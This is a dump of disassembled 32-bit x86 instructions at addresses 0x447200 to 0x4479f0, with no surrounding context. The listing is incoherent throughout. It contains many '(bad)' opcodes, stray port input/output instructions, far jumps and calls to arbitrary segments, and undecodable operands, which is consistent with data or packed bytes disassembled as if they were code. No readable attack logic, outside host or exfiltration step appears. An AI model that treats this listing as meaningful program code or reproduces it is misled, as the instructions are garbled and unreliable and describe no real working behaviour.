  447200:	in     eax,0xe0
  447202:	mov    cl,BYTE PTR [eax]
  447204:	cmp    eax,0x6897eeb7
  447209:	xor    eax,DWORD PTR [ebx-0x2de50df]
  44720f:	ins    BYTE PTR es:[edi],dx
  447210:	shl    DWORD PTR [eax+0x5],0x1d
  447214:	scas   al,BYTE PTR es:[edi]
  447215:	in     eax,0xa7
  447217:	stos   DWORD PTR es:[edi],eax
  447218:	and    eax,DWORD PTR [ebx]
  44721a:	and    ch,BYTE PTR [esi+0x58]
  44721d:	loope  0x447261
  44721f:	pop    ecx
  447220:	xchg   ebp,eax
  447221:	and    bl,dh
  447223:	in     eax,0x10
  447225:	popa   
  447226:	xor    eax,0x40f3574b
  44722b:	pop    edi
  44722c:	fdiv   DWORD PTR [ebp-0x40d9319]
  447232:	aam    0x11
  447234:	mov    gs,WORD PTR [ecx]
  447236:	jecxz  0x44721c
  447238:	call   0x27dc:0x45f50d5d
  44723f:	mov    bl,dh
  447241:	sbb    bp,ax
  447244:	pop    esi
  447245:	push   ss
  447246:	test   al,0x0
  447248:	jg     0x447204
  44724a:	sahf   
  44724b:	adc    esi,DWORD PTR ds:0xd997dc5e
  447251:	loope  0x44725a
  447253:	imul   ebx,esi,0x7c
  447256:	pop    ds
  447257:	pushf  
  447258:	pop    esi
  447259:	shl    DWORD PTR [edi],0x61
  44725c:	pop    ecx
  44725d:	xor    BYTE PTR [ecx],cl
  44725f:	push   ebx
  447260:	ret    0xcf60
  447263:	cmc    
  447264:	adc    al,0x39
  447266:	aad    0x3d
  447268:	or     esp,DWORD PTR [ebx-0x1e]
  44726b:	jl     0x4472cb
  44726d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44726e:	xor    edx,0x9ee245
  447274:	pusha  
  447275:	popa   
  447276:	cwde   
  447277:	ins    DWORD PTR es:[edi],dx
  447278:	cmp    al,0xcf
  44727a:	hlt    
  44727b:	add    al,0xfd
  44727d:	fdivr  QWORD PTR [esi-0x4]
  447280:	pop    esi
  447281:	rcr    BYTE PTR [edx+ebp*8+0x63],0xaa
  447286:	adc    dh,BYTE PTR [edx]
  447288:	sbb    DWORD PTR [ecx-0x21],0x3d
  44728c:	cmp    ebx,DWORD PTR [edi+0x70]
  44728f:	icebp  
  447290:	pop    edx
  447291:	and    esp,ecx
  447293:	js     0x4472f3
  447295:	imul   edi,DWORD PTR ds:0x30815487,0xa5610bfb
  44729f:	rol    BYTE PTR [edx],1
  4472a1:	jo     0x447308
  4472a3:	gs push edx
  4472a5:	adc    esi,ebx
  4472a7:	ja     0x447307
  4472a9:	retf   
  4472aa:	aas    
  4472ab:	(bad)  
  4472ac:	or     DWORD PTR [edi+0x6087f9a9],ecx
  4472b2:	fnstcw WORD PTR [edi]
  4472b4:	outs   dx,DWORD PTR ds:[esi]
  4472b5:	outs   dx,DWORD PTR ds:[esi]
  4472b6:	je     0x447319
  4472b8:	pusha  
  4472b9:	xchg   DWORD PTR ds:0x99e0d8d9,esp
  4472bf:	mov    dl,ah
  4472c1:	adc    ch,BYTE PTR [ebp-0x4d9f3615]
  4472c7:	call   0x10aade44
  4472cc:	dec    ebx
  4472cd:	out    dx,eax
  4472ce:	fidiv  WORD PTR [ecx-0x1b11d115]
  4472d4:	sub    al,0xea
  4472d6:	xchg   ecx,eax
  4472d7:	xchg   ebp,eax
  4472d8:	push   edi
  4472d9:	mov    ecx,0x59fbf2c1
  4472de:	jnp    0x4472b6
  4472e0:	ret    
  4472e1:	test   DWORD PTR [edx+0x48e362c1],0x81595ec0
  4472eb:	outs   dx,DWORD PTR ds:[esi]
  4472ec:	mov    bh,0x86
  4472ee:	retf   0x365a
  4472f1:	popa   
  4472f2:	mov    eax,ds:0x3df08cf3
  4472f7:	hlt    
  4472f8:	in     al,dx
  4472f9:	pop    esi
  4472fa:	out    dx,al
  4472fb:	fwait
  4472fc:	cmp    al,0x72
  4472fe:	gs pop ebp
  447300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447301:	or     al,0x49
  447303:	mov    eax,ds:0x433826b2
  447308:	xor    al,0xc8
  44730a:	pop    eax
  44730b:	test   BYTE PTR [esi+0x3c],bl
  44730e:	pop    edx
  44730f:	or     edi,edi
  447311:	test   BYTE PTR [ecx+0x5d6146fc],0x22
  447318:	cdq    
  447319:	push   ecx
  44731a:	mov    ecx,0xdb5f44b5
  44731f:	std    
  447320:	out    dx,al
  447321:	(bad)  
  447322:	out    dx,al
  447323:	pop    ds
  447324:	in     al,0xbe
  447326:	jno    0x447380
  447328:	mov    al,ds:0xa8a0b6d9
  44732d:	pop    edx
  44732e:	ins    DWORD PTR es:[edi],dx
  44732f:	push   esi
  447330:	sar    DWORD PTR [eax],1
  447332:	add    BYTE PTR [ebx],ah
  447334:	pop    esi
  447335:	mov    al,ds:0xd45193be
  44733a:	fxam   
  44733c:	cmc    
  44733d:	pusha  
  44733e:	pop    ecx
  44733f:	repnz out 0xf7,eax
  447342:	mov    dl,0x58
  447344:	mov    BYTE PTR [esi-0x22],bl
  447347:	mov    ebp,0xab76cf5d
  44734c:	enter  0x1b31,0x9
  447350:	xchg   esi,eax
  447351:	inc    ebx
  447352:	jmp    0x59a5524c
  447357:	sub    ah,BYTE PTR [edx]
  447359:	mov    BYTE PTR [ebp-0x68],ch
  44735c:	push   0xffffff9a
  44735e:	jmp    0x447309
  447360:	pop    ebx
  447361:	(bad)  
  447362:	mov    cl,0xcc
  447364:	mov    dh,0xc8
  447366:	out    0xf,al
  447368:	shl    DWORD PTR [eax+0x5],1
  44736b:	pop    DWORD PTR [ecx+0xe]
  44736e:	clc    
  44736f:	ret    0x2339
  447372:	lahf   
  447373:	sub    BYTE PTR [edx+eiz*4+0x63b4b24e],al
  44737a:	out    dx,eax
  44737b:	mov    al,ds:0x72683bf5
  447380:	dec    eax
  447381:	xchg   bh,dl
  447383:	fcomp  QWORD PTR [esi-0x12]
  447386:	stc    
  447387:	lods   al,BYTE PTR ds:[esi]
  447388:	test   eax,0x4206e77a
  44738d:	popa   
  44738e:	fnstenv [esi-0x39a3eb9b]
  447394:	ficom  WORD PTR [ebp-0x12]
  447397:	sbb    DWORD PTR [edx],eax
  447399:	ret    
  44739a:	aaa    
  44739b:	ins    BYTE PTR es:[edi],dx
  44739c:	xchg   esp,eax
  44739d:	inc    ecx
  44739e:	leave  
  44739f:	mov    al,ds:0x8f8416c9
  4473a4:	data16 and BYTE PTR [ecx+0x2],bl
  4473a8:	cmp    bl,bh
  4473aa:	retf   0xb9a0
  4473ad:	xchg   ecx,eax
  4473ae:	xor    al,0x50
  4473b0:	and    al,0x5b
  4473b2:	jo     0x447358
  4473b4:	fisubr WORD PTR [esi]
  4473b6:	push   0x77cbd2b7
  4473bb:	icebp  
  4473bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4473bd:	sbb    al,0xe0
  4473bf:	sbb    esi,DWORD PTR [esi+0x46]
  4473c2:	out    dx,al
  4473c3:	xor    BYTE PTR [esi+eax*8-0x15],ch
  4473c7:	fisub  DWORD PTR [edx-0x388f029]
  4473cd:	push   ecx
  4473ce:	lock popf 
  4473d0:	or     al,0x37
  4473d2:	cs pop esi
  4473d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4473d5:	outs   dx,BYTE PTR ds:[esi]
  4473d6:	inc    ecx
  4473d7:	jns    0x447436
  4473d9:	adc    eax,0x8c94d1ea
  4473de:	jmp    0x44737a
  4473e0:	jb     0x4473bf
  4473e2:	repnz mov ds:0xae3ca0b9,eax
  4473e8:	push   ds
  4473e9:	ds push esi
  4473eb:	in     eax,0x9
  4473ed:	xchg   ebx,eax
  4473ee:	in     eax,dx
  4473ef:	push   ebx
  4473f0:	add    cl,cl
  4473f2:	push   ecx
  4473f3:	shl    DWORD PTR [ebp-0x6590caf3],cl
  4473f9:	dec    esp
  4473fa:	shl    DWORD PTR [eax-0x64c51f4],cl
  447400:	and    al,0xfb
  447402:	cld    
  447403:	in     al,dx
  447404:	gs das 
  447406:	push   ebp
  447407:	jne    0x44742b
  447409:	fidivr WORD PTR [edx+0x7b]
  44740c:	(bad)  
  44740e:	adc    eax,DWORD PTR ds:0xfdcc619d
  447414:	cmp    al,0xf8
  447416:	push   esp
  447417:	mov    eax,ds:0x4fff6369
  44741c:	into   
  44741d:	and    esp,esp
  44741f:	mov    bh,BYTE PTR [edx+0x55]
  447422:	out    dx,al
  447423:	push   esi
  447424:	call   0xc6bb:0x8761251c
  44742b:	mov    al,ds:0xcb0bbe78
  447430:	pop    es
  447431:	mov    ebp,0x8e5e672d
  447436:	sbb    al,0x71
  447438:	call   edi
  44743a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44743b:	test   al,0xf1
  44743d:	mov    dl,0x85
  44743f:	mov    eax,ds:0x9d568992
  447444:	push   ds
  447445:	aad    0xca
  447447:	cmc    
  447448:	pop    esi
  447449:	mov    ?,WORD PTR [edx+ebx*8+0x48]
  44744d:	fst    QWORD PTR [edi-0x65]
  447450:	xchg   ebp,eax
  447451:	pusha  
  447452:	push   es
  447453:	xchg   edx,eax
  447454:	cld    
  447455:	sbb    al,0x28
  447457:	scas   al,BYTE PTR es:[edi]
  447458:	mov    bh,0x39
  44745a:	out    0xc4,eax
  44745c:	rol    BYTE PTR [edi],cl
  44745e:	push   ss
  44745f:	shr    DWORD PTR [esi+0x20e7122f],1
  447465:	popa   
  447466:	pusha  
  447467:	mov    al,0xe6
  447469:	lods   al,BYTE PTR ds:[esi]
  44746a:	mov    BYTE PTR [ecx+0x2df709a8],ch
  447470:	adc    esi,DWORD PTR [ebx]
  447472:	jmp    0x447457
  447474:	push   esp
  447475:	jnp    0x44746a
  447477:	and    bl,bh
  447479:	mov    esi,0xde40a186
  44747e:	lods   eax,DWORD PTR ds:[esi]
  44747f:	inc    edi
  447480:	xor    edx,0x5d
  447483:	adc    DWORD PTR [ecx+0x7d],0x921b5b84
  44748a:	cmp    al,0xdf
  44748c:	into   
  44748d:	sub    dh,BYTE PTR [esi+ebp*4-0xea49f25]
  447494:	dec    esi
  447495:	out    0xf,eax
  447497:	jo     0x4474c9
  447499:	mov    ecx,0x745929f0
  44749e:	and    eax,ecx
  4474a0:	push   es
  4474a1:	xor    eax,0x2de1dd45
  4474a6:	inc    eax
  4474a7:	xchg   edi,eax
  4474a8:	adc    al,0x72
  4474aa:	lahf   
  4474ab:	mov    eax,ds:0xd0099e1f
  4474b0:	icebp  
  4474b1:	push   edx
  4474b2:	out    dx,al
  4474b3:	pop    esp
  4474b4:	clc    
  4474b5:	sub    eax,0x75891783
  4474ba:	inc    ebp
  4474bb:	mov    eax,ds:0xefdacfdc
  4474c0:	pop    ecx
  4474c1:	inc    esp
  4474c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4474c3:	(bad)  
  4474c4:	pop    ebx
  4474c5:	sbb    al,0x97
  4474c7:	mov    ds:0xd97e98c5,eax
  4474cc:	inc    esi
  4474cd:	popf   
  4474ce:	pop    ebx
  4474cf:	mov    eax,ds:0x455fc266
  4474d4:	out    0x49,eax
  4474d6:	jp     0x4474c2
  4474d8:	mov    dh,0x58
  4474da:	out    dx,al
  4474db:	daa    
  4474dc:	dec    BYTE PTR [edx-0x52]
  4474df:	inc    ebp
  4474e0:	call   0x5cc3cbdf
  4474e5:	popa   
  4474e6:	pop    ss
  4474e7:	sbb    al,0xb8
  4474e9:	sbb    cl,BYTE PTR [esi]
  4474eb:	mov    cs,WORD PTR [edi]
  4474ed:	outs   dx,DWORD PTR ds:[esi]
  4474ee:	dec    DWORD PTR [esi-0x2493c351]
  4474f4:	clc    
  4474f5:	jno    0x447534
  4474f7:	add    DWORD PTR [ebp+0x756cc890],ebp
  4474fd:	pop    esi
  4474fe:	loope  0x4474b8
  447500:	fdivr  DWORD PTR [ecx-0x4001c18a]
  447506:	mov    bh,0x28
  447508:	arpl   WORD PTR [esi+0x11eb662b],cx
  44750e:	in     al,dx
  44750f:	aas    
  447510:	xchg   edi,eax
  447511:	stc    
  447512:	and    al,0x0
  447514:	jmp    0x6353:0xd55d6ec4
  44751b:	mov    eax,ds:0x523e5804
  447520:	xor    esi,ebx
  447522:	mov    DWORD PTR ds:0xd36a255e,edx
  447528:	fwait
  447529:	xchg   BYTE PTR es:[edi],bl
  44752c:	jbe    0x447591
  44752e:	push   ds
  44752f:	fwait
  447530:	pop    edi
  447531:	push   0xed24e9c2
  447536:	mov    gs,WORD PTR [edi-0x2810b9e5]
  44753c:	int    0x3d
  44753e:	cmp    BYTE PTR [eax-0x50],ah
  447541:	add    BYTE PTR ds:0xa9177d53,cl
  447547:	mov    al,ds:0xc94fac12
  44754c:	xchg   ebx,eax
  44754d:	sti    
  44754e:	aaa    
  44754f:	in     eax,0xfe
  447551:	mov    WORD PTR [ebx+eax*2],ss
  447554:	pop    ecx
  447555:	test   DWORD PTR [ebp-0x5f],eax
  447558:	out    0x74,al
  44755a:	loop   0x447546
  44755c:	push   0x5f315048
  447561:	sub    ch,BYTE PTR [eax]
  447563:	in     eax,0x88
  447565:	das    
  447566:	mov    BYTE PTR [ecx+0x1e],bh
  447569:	ja     0x447520
  44756b:	mov    WORD PTR [edx+0x55],gs
  44756e:	enter  0x6060,0xa0
  447572:	(bad)  
  447573:	xchg   edx,eax
  447574:	cli    
  447575:	cmc    
  447576:	out    dx,al
  447577:	xchg   dx,ax
  447579:	pop    es
  44757a:	mov    bl,0xd6
  44757c:	adc    ch,BYTE PTR [ecx+0x7d]
  44757f:	ins    DWORD PTR es:[edi],dx
  447580:	fs popa 
  447582:	or     cl,BYTE PTR [eax+edx*1]
  447585:	(bad)  
  447586:	gs call 0x4232e2af
  44758c:	daa    
  44758d:	fimul  DWORD PTR [ebx]
  44758f:	imul   ecx,esp,0x33c8ce08
  447595:	arpl   WORD PTR [ebp+0x7792e60],bp
  44759b:	mov    eax,ds:0xe095397c
  4475a0:	stc    
  4475a1:	sbb    DWORD PTR [esi+0x9dc5d6d],ebx
  4475a7:	xchg   esi,eax
  4475a8:	in     eax,0xc1
  4475aa:	jmp    0x447551
  4475ac:	out    dx,al
  4475ad:	cld    
  4475ae:	mov    dl,0xa0
  4475b0:	jmp    0x44755a
  4475b2:	sub    DWORD PTR [eax-0x52],edx
  4475b5:	mov    al,ds:0xea5e3dc8
  4475ba:	(bad)
  4475bd:	or     al,0xca
  4475bf:	pop    ebp
  4475c0:	stc    
  4475c1:	gs loop 0x44756f
  4475c4:	int3   
  4475c5:	mov    cl,0xf7
  4475c7:	mov    al,ds:0xb7cfad2a
  4475cc:	loopne 0x4475c6
  4475ce:	out    dx,al
  4475cf:	fidivr WORD PTR [esi]
  4475d1:	es sti 
  4475d3:	mov    ah,bh
  4475d5:	dec    edi
  4475d6:	or     DWORD PTR [edi-0x177e22c3],ecx
  4475dc:	cld    
  4475dd:	mov    edx,0xd291d474
  4475e2:	ss jle 0x447613
  4475e5:	in     al,0x26
  4475e7:	pop    ebp
  4475e8:	sbb    DWORD PTR [ecx+0x4c],esp
  4475eb:	shl    ebp,cl
  4475ed:	ins    DWORD PTR es:[edi],dx
  4475ee:	dec    edx
  4475ef:	in     eax,dx
  4475f0:	shl    BYTE PTR [eax+0x17],0x39
  4475f4:	push   edi
  4475f5:	pop    esi
  4475f6:	in     eax,0x92
  4475f8:	pushf  
  4475f9:	jae    0x4475e9
  4475fb:	pop    edx
  4475fc:	aam    0x4d
  4475fe:	in     eax,dx
  4475ff:	xchg   esp,edi
  447601:	ja     0x447644
  447603:	mov    eax,ds:0x1f9d5b29
  447608:	and    eax,0x5eceff96
  44760d:	xor    al,0x75
  44760f:	(bad)  
  447610:	cwde   
  447611:	pop    es
  447612:	jge    0x44767f
  447614:	pop    ss
  447615:	popa   
  447616:	xchg   ebp,eax
  447617:	scas   al,BYTE PTR es:[edi]
  447618:	aam    0x83
  44761a:	mov    bh,0x53
  44761c:	push   ds
  44761d:	and    al,0xee
  44761f:	cmp    DWORD PTR [ebx*4+0x7012203f],0x6694a188
  44762a:	scas   eax,DWORD PTR es:[edi]
  44762b:	xor    edx,DWORD PTR [esi-0x5c]
  44762e:	nop
  44762f:	mov    al,ds:0x849eb15e
  447634:	xor    DWORD PTR ds:0x61095301,ebp
  44763a:	lock inc ebx
  44763c:	jl     0x447636
  44763e:	pop    esp
  44763f:	repz test BYTE PTR [edx],bl
  447642:	in     eax,dx
  447643:	cmp    al,0x5a
  447645:	dec    ebp
  447646:	mov    ebx,0x5a9cd308
  44764b:	push   eax
  44764c:	js     0x4476ae
  44764e:	mov    dh,BYTE PTR [edx-0x1c5368eb]
  447654:	dec    ebx
  447655:	mov    ch,0xee
  447657:	dec    esi
  447658:	stos   DWORD PTR es:[edi],eax
  447659:	or     DWORD PTR [eax+0x7c6c2f],ebp
  44765f:	mov    eax,ds:0xa2aefcf8
  447664:	sahf   
  447665:	cmp    BYTE PTR [ebx-0x11718d4e],ch
  44766b:	sbb    dl,ah
  44766d:	lods   al,BYTE PTR ds:[esi]
  44766e:	scas   eax,DWORD PTR es:[edi]
  44766f:	or     esi,0x9af6f8a7
  447675:	pusha  
  447676:	mov    esi,0x2b28e23
  44767b:	iret   
  44767c:	xchg   edi,eax
  44767d:	ja     0x44766d
  44767f:	cmc    
  447680:	pop    edx
  447681:	rcl    BYTE PTR [ecx-0x7a],0xe2
  447685:	dec    esp
  447686:	sahf   
  447687:	mov    eax,ds:0x739e548
  44768c:	xor    BYTE PTR [edi-0x65],ah
  44768f:	(bad)  
  447690:	pop    ecx
  447691:	scas   al,BYTE PTR es:[edi]
  447692:	sub    al,0xdf
  447694:	imul   edi,DWORD PTR [eax+eax*1],0x27
  447698:	sahf   
  447699:	(bad)  
  44769a:	inc    eax
  44769b:	mov    ebp,0x74dc9c06
  4476a0:	call   0x4e47:0xde68fc60
  4476a7:	pop    ds
  4476a8:	in     al,dx
  4476a9:	sbb    eax,0xa6ea54ff
  4476ae:	out    dx,al
  4476af:	mov    esi,DWORD PTR [ebp+0x20]
  4476b2:	daa    
  4476b3:	retf   0x5bc3
  4476b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4476b7:	jle    0x44770e
  4476b9:	aam    0x75
  4476bb:	mov    eax,ds:0x94c7e399
  4476c0:	(bad)  
  4476c1:	lods   eax,DWORD PTR ds:[esi]
  4476c2:	out    dx,al
  4476c3:	xor    al,0x13
  4476c5:	sbb    edi,DWORD PTR [edi+eax*2]
  4476c8:	xchg   edi,eax
  4476c9:	adc    eax,0x63e8a192
  4476ce:	bound  esi,QWORD PTR [esi+0x26]
  4476d1:	icebp  
  4476d2:	and    al,0xea
  4476d4:	pop    esi
  4476d5:	or     BYTE PTR [edx+ecx*2],al
  4476d8:	inc    ebp
  4476d9:	cli    
  4476da:	int    0x3d
  4476dc:	ins    DWORD PTR es:[edi],dx
  4476dd:	pusha  
  4476de:	or     DWORD PTR [edi],ebx
  4476e0:	cmp    eax,0xeed9c943
  4476e5:	mov    edx,0xe982f4ee
  4476ea:	mov    ds:0x7e0f1676,eax
  4476ef:	mov    ecx,0xa191c992
  4476f4:	(bad)  
  4476f5:	aad    0xb5
  4476f7:	push   es
  4476f8:	cmp    ebx,DWORD PTR [eax-0x4fa1c404]
  4476fe:	sbb    BYTE PTR [ebx+0x4d],dh
  447701:	cdq    
  447702:	push   es
  447703:	jmp    0x2597d805
  447708:	or     edi,ebx
  44770a:	push   eax
  44770b:	mov    esp,0xec9e9c50
  447710:	pop    esi
  447711:	cmp    ecx,ecx
  447713:	push   esi
  447714:	add    ah,BYTE PTR [eax-0x2d]
  447717:	or     ch,BYTE PTR [esi+0x596a9b60]
  44771d:	jmp    0x16ee:0xf3a3cdce
  447724:	ret    0xff11
  447727:	dec    edx
  447728:	pusha  
  447729:	or     eax,DWORD PTR [edx+0x252033a1]
  44772f:	(bad)  
  447730:	rol    DWORD PTR ds:0x9aed2e61,1
  447736:	out    dx,al
  447737:	shr    BYTE PTR [ebp+0x1fedcd91],cl
  44773d:	imul   edi,edi,0xffffffa0
  447740:	imul   BYTE PTR [edi+ecx*1]
  447743:	mov    eax,0x7c9562dd
  447748:	pop    esi
  447749:	into   
  44774a:	and    dh,BYTE PTR [edx+0x64]
  44774d:	cld    
  44774e:	mov    esi,0xb3267c6e
  447753:	xor    BYTE PTR [edi+0x2665ea60],bh
  447759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44775a:	dec    ebp
  44775b:	cmp    ch,ah
  44775d:	dec    esi
  44775e:	out    dx,al
  44775f:	hlt    
  447760:	jne    0x447716
  447762:	and    ebx,DWORD PTR [esi-0x5ebe3dea]
  447768:	cld    
  447769:	sbb    esi,esp
  44776b:	mov    esi,0x732c3df5
  447770:	pop    ebp
  447771:	outs   dx,DWORD PTR ds:[esi]
  447772:	cld    
  447773:	or     DWORD PTR [esi+edi*4-0x34],esp
  447777:	xchg   esi,eax
  447778:	mov    ch,ah
  44777a:	ins    BYTE PTR es:[edi],dx
  44777b:	and    ebx,0x5f
  44777e:	jmp    0x44774e
  447780:	icebp  
  447781:	cmp    ah,ch
  447783:	(bad)  [edi+0x5e64b330]
  447789:	mov    ecx,0x71e8b713
  44778e:	(bad)  
  44778f:	and    eax,0x6947610e
  447794:	(bad)  
  447795:	xchg   ebx,eax
  447796:	test   al,0x72
  447798:	xlat   BYTE PTR ds:[ebx]
  447799:	std    
  44779a:	in     al,dx
  44779b:	and    dh,BYTE PTR [ebp+0x5e]
  44779e:	neg    DWORD PTR [ebx-0x2eb5df46]
  4477a4:	or     DWORD PTR ds:0x3a5d6d15,eax
  4477aa:	and    DWORD PTR [edx],edx
  4477ac:	mov    eax,0xb4c143a5
  4477b1:	pop    ebp
  4477b2:	hlt    
  4477b3:	fld    QWORD PTR [edi]
  4477b5:	mov    al,ds:0x655f7474
  4477ba:	add    DWORD PTR [ecx-0x4fa62f0b],edi
  4477c0:	jb     0x447822
  4477c2:	outs   dx,DWORD PTR ds:[esi]
  4477c3:	jl     0x4477db
  4477c5:	aam    0xa6
  4477c7:	icebp  
  4477c8:	cmp    eax,0x62bcee37
  4477cd:	mov    eax,ds:0x1a556ad8
  4477d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4477d3:	scas   al,BYTE PTR es:[edi]
  4477d4:	mov    edx,0x52eab2fe
  4477d9:	aad    0x53
  4477db:	loope  0x447829
  4477dd:	mov    BYTE PTR [eax],al
  4477df:	adc    dh,al
  4477e1:	(bad)  
  4477e2:	out    dx,al
  4477e3:	gs jnp 0x447829
  4477e6:	je     0x4477b5
  4477e8:	push   edx
  4477e9:	or     ebp,DWORD PTR [eax]
  4477eb:	mov    eax,ds:0x939b2538
  4477f0:	dec    eax
  4477f1:	push   edi
  4477f2:	xlat   BYTE PTR ds:[ebx]
  4477f3:	fistp  WORD PTR [esi+0x22]
  4477f6:	lods   eax,DWORD PTR ds:[esi]
  4477f7:	cmc    
  4477f8:	pop    es
  4477f9:	out    dx,eax
  4477fa:	imul   ecx,DWORD PTR [esi-0x7f],0x8d615860
  447801:	adc    edi,DWORD PTR [ecx-0x11da1473]
  447807:	test   ch,0x42
  44780a:	mov    ebp,0xf7e69879
  44780f:	fsub   st,st(0)
  447811:	push   eax
  447812:	int    0x98
  447814:	jno    0x447802
  447816:	ss pop ebp
  447818:	shr    BYTE PTR [edx-0x34b0d014],0x79
  44781f:	mov    ebx,0xd5fec06f
  447824:	call   0x9de57ed7
  447829:	scas   eax,DWORD PTR es:[edi]
  44782a:	mov    edx,0xa5ea6596
  44782f:	mov    edx,0xc236b25e
  447834:	icebp  
  447835:	push   esi
  447836:	lods   al,BYTE PTR ds:[esi]
  447837:	mov    esp,0xbf4b60e5
  44783c:	xor    al,0xde
  44783e:	(bad)  
  44783f:	rol    DWORD PTR [edi-0x3f],cl
  447842:	out    dx,al
  447843:	in     eax,0x3c
  447845:	mov    ?,WORD PTR [edx+0x688fdb4a]
  44784b:	fucomp st(2)
  44784d:	mov    ecx,0x332b64ee
  447852:	push   cs
  447853:	jp     0x4477eb
  447855:	imul   esi
  447857:	fcmovne st,st(4)
  447859:	sub    DWORD PTR [ebx-0xbf51217],edi
  44785f:	mov    al,ds:0xec6c4ed5
  447864:	jmp    0xc4b4:0x6315f38d
  44786b:	xor    eax,0x904a409c
  447870:	sti    
  447871:	mov    ah,0xd1
  447873:	jl     0x447875
  447875:	addr16 pop ss
  447877:	(bad)  
  447878:	rcr    esp,1
  44787a:	fimul  DWORD PTR [edi+0x34efa0e6]
  447880:	lods   eax,DWORD PTR ds:[esi]
  447881:	cmc    
  447882:	sbb    BYTE PTR [esi+ebx*2-0x3d7f5f70],ah
  447889:	cmp    BYTE PTR [eax+0x78613003],cl
  44788f:	cmp    ah,BYTE PTR [ebx-0x6e3606c9]
  447895:	dec    edx
  447896:	and    eax,0xe4442689
  44789b:	cs pop esi
  44789d:	dec    esi
  44789e:	dec    esp
  44789f:	push   edx
  4478a0:	jno    0x447866
  4478a2:	xchg   esi,eax
  4478a4:	ret    0xae71
  4478a7:	xchg   edx,eax
  4478a8:	pop    ds
  4478a9:	aaa    
  4478aa:	fnstsw WORD PTR [edx+0x1beeb974]
  4478b0:	cwde   
  4478b1:	call   0x44beca2e
  4478b6:	mov    DWORD PTR [ecx-0x172e290c],esp
  4478bc:	rcl    DWORD PTR [esi],0x6c
  4478bf:	sbb    bl,BYTE PTR [esi+0x16]
  4478c2:	dec    esi
  4478c3:	(bad)  
  4478c4:	icebp  
  4478c5:	mov    ecx,0xc1254315
  4478ca:	pop    es
  4478cb:	mov    eax,ds:0xbffea412
  4478d0:	xchg   DWORD PTR [edx],edx
  4478d2:	push   esi
  4478d3:	(bad)  
  4478d4:	pop    edi
  4478d5:	and    bl,BYTE PTR [ebx+0x1]
  4478d8:	inc    esp
  4478d9:	push   edx
  4478da:	ds xor esp,0x4ba0bee6
  4478e1:	and    eax,0x7c3896f3
  4478e6:	lock call 0xe02fac56
  4478ec:	mov    cl,0x53
  4478ee:	fimul  DWORD PTR [edx]
  4478f0:	ins    DWORD PTR es:[edi],dx
  4478f1:	call   0x610a1dbf
  4478f6:	or     BYTE PTR [esi],bh
  4478f8:	mov    ch,0x3d
  4478fa:	pop    ds
  4478fb:	push   0xffffffcf
  4478fd:	cdq    
  4478fe:	out    dx,al
  4478ff:	xor    esp,esp
  447901:	scas   al,BYTE PTR es:[edi]
  447902:	mov    ecx,0x97b12e0a
  447907:	mov    eax,ds:0xbb0df144
  44790c:	pop    edx
  44790d:	fbstp  TBYTE PTR [eax-0x6fabac54]
  447913:	lods   al,BYTE PTR ds:[esi]
  447914:	fidiv  DWORD PTR [ebp+0x53]
  447917:	bnd jae 0x4478b9
  44791a:	fs sbb bh,0x80
  44791e:	mov    cs,WORD PTR [ebp+0x36338d5e]
  447924:	pshufw mm7,QWORD PTR [esi+0xc52f7fc],0xa5
  44792c:	ins    BYTE PTR es:[edi],dx
  44792d:	ins    BYTE PTR es:[edi],dx
  44792e:	lods   eax,DWORD PTR ds:[esi]
  44792f:	iret   
  447930:	(bad)  
  447931:	xchg   esp,eax
  447932:	popf   
  447933:	popa   
  447934:	xchg   esi,eax
  447935:	loopne 0x447924
  447937:	pop    ecx
  447938:	in     eax,0x49
  44793a:	adc    bh,cl
  44793c:	retf   0x661c
  44793f:	cmp    BYTE PTR [eax],bh
  447941:	pusha  
  447942:	jmp    0xa32f7efd
  447947:	rcr    BYTE PTR [edi-0x419ea775],0x78
  44794e:	out    dx,al
  44794f:	es mov ebp,0x914d7869
  447955:	sti    
  447956:	jmp    0x544d67fb
  44795b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44795c:	cli    
  44795d:	out    dx,eax
  44795e:	mov    bl,0x8b
  447960:	fs ret 
  447962:	(bad)  
  447963:	fld    DWORD PTR [edi+0x4a]
  447966:	out    dx,al
  447967:	mov    WORD PTR [edi],?
  447969:	cmp    BYTE PTR [eax+0x6560de84],ch
  44796f:	repz scas al,BYTE PTR es:[edi]
  447971:	and    ebx,esi
  447973:	jae    0x447937
  447975:	imul   dh
  447977:	hlt    
  447978:	and    esi,DWORD PTR [esi-0x3a097288]
  44797e:	ins    BYTE PTR es:[edi],dx
  44797f:	mov    eax,ds:0x59db22a
  447984:	mov    esp,0x5e1e24e0
  447989:	mov    BYTE PTR [ecx+0x79],ch
  44798c:	jmp    0x586b9e97
  447991:	and    eax,0x85a79083
  447996:	shl    DWORD PTR [ecx+eiz*4],1
  447999:	fnsave [edx-0x16118ee0]
  44799f:	sub    al,0x5e
  4479a1:	and    esi,DWORD PTR [edx+0x7b]
  4479a4:	retf   0x32b8
  4479a7:	or     ecx,ebp
  4479a9:	addr16 inc eax
  4479ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4479ac:	push   ebx
  4479ad:	and    dh,BYTE PTR [ebx]
  4479af:	popa   
  4479b0:	sbb    ah,al
  4479b2:	clc    
  4479b3:	inc    edx
  4479b4:	xchg   esi,eax
  4479b5:	adc    esi,ebp
  4479b7:	pushf  
  4479b8:	pop    edx
  4479b9:	jl     0x447972
  4479bb:	sbb    al,0xfb
  4479bd:	fisub  WORD PTR es:[eax+0x33719b2]
  4479c4:	mov    db6,ebp
  4479c7:	jle    0x447a29
  4479c9:	sub    dh,BYTE PTR ds:0x8f8ba215
  4479cf:	add    DWORD PTR [esi-0x6d5f436a],0x2ccd80c8
  4479d9:	mov    ecx,0x815e8d5d
  4479de:	or     edx,eax
  4479e0:	stc    
  4479e1:	addr16 inc ecx
  4479e3:	fsubr  QWORD PTR [ebp-0x5b909e30]
  4479e9:	pusha  
  4479ea:	sub    DWORD PTR [edx],0xcab0345a
  4479f0:	in     al,dx
